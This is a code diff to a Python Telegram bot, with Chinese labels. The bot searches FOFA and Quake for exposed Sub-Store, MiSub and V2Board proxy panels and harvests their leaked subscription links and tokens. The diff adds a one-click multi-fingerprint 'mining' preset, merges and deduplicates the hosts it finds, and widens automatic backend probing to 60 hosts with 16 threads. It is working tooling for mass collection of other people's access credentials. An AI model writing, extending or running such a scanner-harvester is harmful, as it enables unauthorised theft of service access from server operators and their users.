@@ -109,8 +109,23 @@ BOT_COMMANDS = [
     ('help', '帮助'),
 ]
 
+MULTI_FOFA = [
+    'body="SUB_STORE_FRONTEND_BACKEND_PATH"',   # 实测最出量：24 台 → 47 条
+    'header="X-Powered-By: Sub-Store"',
+    'title="MiSub"',
+    'body="/api/v1/client/subscribe?token="',
+]
+MULTI_QUAKE = [
+    'body:"Sub-Store"',
+    'body:"/api/public/profiles"',
+    'app:"misub"',
+    'body:"/api/v1/client/subscribe?token="',
+]
+
 FOFA_PRESETS = [
-    ('📡 订阅泄漏(带token) ⭐', 'body="/api/v1/client/subscribe?token="'),
+    ('🔥 一键连挖(4 指纹) ⭐', '__MULTI__'),
+    ('🧠 Sub-Store 前端路径 (最出量)', 'body="SUB_STORE_FRONTEND_BACKEND_PATH"'),
+    ('📡 订阅泄漏(带token)', 'body="/api/v1/client/subscribe?token="'),
     ('🛰 Sub-Store 后端', 'header="X-Powered-By: Sub-Store"'),
     ('🧭 V2Board 面板', 'body="/api/v1/guest/comm/config"'),
     ('🔮 MiSub 中台', 'body="/api/public/profiles"'),
@@ -121,7 +136,8 @@ FOFA_PRESETS = [
 ]
 
 QUAKE_PRESETS = [
-    ('📡 订阅泄漏(带token) ⭐', 'body:"/api/v1/client/subscribe?token="'),
+    ('🔥 一键连挖(4 指纹) ⭐', '__MULTI__'),
+    ('📡 订阅泄漏(带token)', 'body:"/api/v1/client/subscribe?token="'),
     ('🧭 V2Board 面板', 'app:"v2board"'),
     ('🌐 Sub-Store 后端', 'body:"Sub-Store"'),
     ('🛰 TURN/STUN', 'service:"stun"'),
@@ -371,8 +387,9 @@ def detail_view(chat_id, kind, idx):
     return '\n'.join(lines), kb
 
 # ---------------------------------------------------------------- 搜索
-def do_search(chat_id, engine, q, reply_to=None, auto_turn=False):
-    """后台线程执行搜索, 完成后发文件 + 收割订阅"""
+def do_search(chat_id, engine, q, reply_to=None, auto_turn=False, queries=None):
+    """后台线程执行搜索, 完成后发文件 + 收割订阅
+    queries 非空时跑多指纹连挖，结果合并去重"""
     key = (chat_id, engine)
     with JOBS_LOCK:
         if key in SEARCHING:
@@ -382,20 +399,42 @@ def do_search(chat_id, engine, q, reply_to=None, auto_turn=False):
 
     def _run():
         try:
+            qs = list(queries) if queries else [q]
             if engine == 'fofa':
                 if not ((FOFA_EMAIL and FOFA_KEY) or FOFA_PROXY_KEY):
                     send(chat_id, '❌ 未配置 FOFA: 在 .env 里填 FOFA_EMAIL 和 FOFA_KEY')
                     return
-                send(chat_id, f'🔍 FOFA 搜索中…\n查询: {q[:200]}')
-                res = fofa.search(FOFA_EMAIL, FOFA_KEY, q, size=FOFA_SIZE)
             else:
                 if not QUAKE_KEY:
                     send(chat_id, '❌ 未配置 Quake: 在 .env 里填 QUAKE_KEY')
                     return
-                send(chat_id, f'🔍 QUAKE 搜索中…\n查询: {q[:200]}')
-                res = quake.search(QUAKE_KEY, q, size=QUAKE_SIZE)
 
-            rows = res['rows']
+            send(chat_id, f'🔍 {engine.upper()} 搜索中…\n指纹 {len(qs)} 个'
+                          + ('' if len(qs) == 1 else '（连挖，稍等）'))
+            rows, total_max, hit_hosts, errs = [], 0, set(), []
+            for i, qq in enumerate(qs, 1):
+                try:
+                    if engine == 'fofa':
+                        rr = fofa.search(FOFA_EMAIL, FOFA_KEY, qq, size=FOFA_SIZE)
+                    else:
+                        rr = quake.search(QUAKE_KEY, qq, size=QUAKE_SIZE)
+                except Exception as ee:
+                    errs.append('%s: %s' % (qq[:30], str(ee)[:60]))
+                    continue
+                total_max = max(total_max, rr.get('total') or 0)
+                for r0 in rr.get('rows') or []:
+                    h0 = str(r0.get('host') or '')
+                    if h0 and h0 in hit_hosts:
+                        continue
+                    hit_hosts.add(h0)
+                    rows.append(r0)
+                if len(qs) > 1:
+                    send(chat_id, f'🔍 指纹 {i}/{len(qs)} 命中 {rr.get("total")} · 累计 {len(rows)} 台')
+            if not rows:
+                send(chat_id, '❌ 全部指纹都没命中\n' + '\n'.join(errs[:3]))
+                return
+            q = ' + '.join(x[:40] for x in qs) if len(qs) > 1 else qs[0]
+            res = {'total': total_max, 'rows': rows}
             TOOL_KW = ('订阅转换', '订阅工具', '转换工具', '替换工具', '测速', '中转', '工作台',
                        '同步', '镜像', '生成器', '订阅管理', '在线工具', 'SubReplay',
                        'Sub Sync', 'Sub-Store')
@@ -426,9 +465,9 @@ def do_search(chat_id, engine, q, reply_to=None, auto_turn=False):
             # —— 后端探测：Sub-Store /api/subs 与 MiSub，命中率远高于网页抓
             try:
                 import concurrent.futures as _cf2
-                hosts = [str(r0.get('host') or '') for r0 in rows[:16] if r0.get('host')]
+                hosts = [str(r0.get('host') or '') for r0 in rows[:60] if r0.get('host')]
                 if hosts:
-                    with _cf2.ThreadPoolExecutor(max_workers=8) as _ex2:
+                    with _cf2.ThreadPoolExecutor(max_workers=16) as _ex2:
                         for got, note in _ex2.map(harvest.probe_host, hosts):
                             harvested.extend(got)
             except Exception as _e:
@@ -1417,8 +1456,13 @@ def handle_callback(cb):
             i = int(parts[2])
             if 0 <= i < len(presets):
                 label, q = presets[i]
-                show(f'🔍 {eng.upper()} 搜索中…\n{label}\n{q[:120]}')
-                do_search(chat_id, eng, q)
+                if q == '__MULTI__':
+                    qs = MULTI_FOFA if eng == 'fofa' else MULTI_QUAKE
+                    show('🔥 %s 一键连挖\n%d 个指纹同时跑，结果合并去重' % (eng.upper(), len(qs)))
+                    do_search(chat_id, eng, qs[0], queries=qs)
+                else:
+                    show(f'🔍 {eng.upper()} 搜索中…\n{label}\n{q[:120]}')
+                    do_search(chat_id, eng, q)
             return
         # 预设菜单
         if eng == 'fofa':
